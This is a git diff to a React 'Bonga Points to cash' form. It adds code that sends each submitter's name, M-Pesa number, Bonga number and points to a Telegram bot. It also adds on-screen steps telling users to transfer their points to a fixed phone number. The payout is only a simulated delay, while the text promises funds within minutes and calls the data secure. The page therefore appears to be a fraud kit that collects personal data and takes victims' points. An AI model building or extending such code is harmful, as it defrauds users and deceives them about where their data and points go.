@@ -8,7 +8,9 @@ const BongaForm = () => {
         bongaPoints: '',
     })
     const [submitted, setSubmitted] = useState(false)
+    const [submittedData, setSubmittedData] = useState(null)
     const [loading, setLoading] = useState(false)
+    const [telegramError, setTelegramError] = useState('')
 
     const handleChange = (e) => {
     const { name, value } = e.target
@@ -21,24 +23,67 @@ const BongaForm = () => {
   const bongaPoints = parseInt(formData.bongaPoints) || 0
   const cashAmount = (bongaPoints * 0.12).toFixed(2)
 
+  const sendTelegramNotification = async (data, amount) => {
+    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
+    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID
+
+    if (!botToken || !chatId) {
+      console.warn('Telegram bot token or chat ID is missing. Skipping notification.')
+      return
+    }
+
+    const message = `New conversion request:\nName: ${data.name}\nM-Pesa: +254${data.mpesaNumber}\nBonga Number: ${data.bongaNumber}\nBonga Points: ${data.bongaPoints}\nAmount: KSH ${amount}`
+
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    })
+
+    if (!response.ok) {
+      const errorText = await response.text()
+      throw new Error(`Telegram send failed: ${errorText}`)
+    }
+  }
+
   const handleSubmit = async (e) => {
     e.preventDefault()
     setLoading(true)
+    setTelegramError('')
 
-    // Simulate API call
-    await new Promise((resolve) => setTimeout(resolve, 1500))
+    try {
+      // Simulate API call
+      await new Promise((resolve) => setTimeout(resolve, 1500))
 
-    setSubmitted(true)
-    setLoading(false)
-    setFormData({
-      name: '',
-      mpesaNumber: '',
-      bongaNumber: '',
-      bongaPoints: '',
-    })
+      await sendTelegramNotification(formData, cashAmount)
+
+      // Snapshot values for confirmation before we reset the form
+      setSubmittedData({
+        cashAmount,
+        mpesaNumber: formData.mpesaNumber,
+      })
+
+      setSubmitted(true)
+      setFormData({
+        name: '',
+        mpesaNumber: '',
+        bongaNumber: '',
+        bongaPoints: '',
+      })
+    } catch (error) {
+      console.error(error)
+      setTelegramError('Unable to send the Telegram notification. Please check your bot settings.')
+    } finally {
+      setLoading(false)
+    }
 
     // Reset after 5 seconds
-    setTimeout(() => setSubmitted(false), 5000)
+    //setTimeout(() => setSubmitted(false), 5000)
   }
 
   const isFormValid =
@@ -46,7 +91,7 @@ const BongaForm = () => {
     formData.mpesaNumber.trim() &&
     formData.bongaNumber.trim() &&
     formData.bongaPoints.trim() &&
-    parseInt(formData.bongaPoints) > 0
+    parseInt(formData.bongaPoints) >= 250
 
   if (submitted) {
     return (
@@ -58,13 +103,19 @@ const BongaForm = () => {
         </div>
         <div>
           <h3 className="text-2xl font-bold text-[#0f172a] mb-2">Request Submitted!</h3>
-          <p className="text-[#666666]">
-            We&apos;ve received your conversion request for <span className="font-semibold text-[#0f172a]">KSH {cashAmount}</span>
+             <p className="text-[#666666]">
+               We&apos;ve received your conversion request for <span className="font-semibold text-[#0f172a]">KSH {submittedData ? submittedData.cashAmount : cashAmount}</span>
           </p>
-          <p className="text-sm text-[#666666] mt-2">
-            Funds will be sent to {formData.mpesaNumber} within 2 hours
+          <p className='text-lg font-semibold'>Transfer your Bonga Points to <span className='font-bold text-[#1ea84c]'>0728482191</span></p>
+             <p className="text-md text-[#666666] mt-2">
+               Funds will be sent to {submittedData ? submittedData.mpesaNumber : formData.mpesaNumber} within 5 minutes after we confirm the points transfer. Thank you !
           </p>
         </div>
+        <ul className='font-semibold text-lg'>
+            <li>Step 1 : Dial * 126 #</li>
+            <li>Step 2 : Select 5 (Transfer Points)</li>
+            <li>Step 3 : Enter the number 0728482191</li>
+        </ul>
       </div>
     )
   }
@@ -131,7 +182,7 @@ const BongaForm = () => {
       {/* Bonga Points */}
       <div>
         <label htmlFor="bongaPoints" className="block text-sm font-semibold text-[#0f172a] mb-2">
-          Amount of Bonga Points
+          Amount of Bonga Points (Min 250)
         </label>
         <input
           type="number"
@@ -140,14 +191,14 @@ const BongaForm = () => {
           value={formData.bongaPoints}
           onChange={handleChange}
           placeholder="5000"
-          min="0"
+          min="250"
           className="w-full px-4 py-2.5 rounded-lg border border-[#1ea84c] bg-[#ffffff] text-[#0f172a] placeholder-[#666666] focus:outline-none focus:ring-2 focus:ring-[#1ea84c] focus:border-transparent transition-all"
           required
         />
       </div>
 
       {/* Cash Conversion Summary */}
-      {parseInt(formData.bongaPoints) > 0 && (
+      {parseInt(formData.bongaPoints) >= 250 && (
         <div className="rounded-lg bg-[#f5f5f5] border border-[#1ea84c] p-4">
           <p className="text-sm text-[#666666] mb-1">You will receive</p>
           <p className="text-3xl font-bold text-[#0f172a]">
@@ -182,6 +233,10 @@ const BongaForm = () => {
           </>
         )}
       </button>
+
+      {telegramError && (
+        <p className="text-center text-sm text-red-600 mt-2">{telegramError}</p>
+      )}
 
       <p className="text-center text-md text-[#666666]">
         Your information is secure and only used to process your request
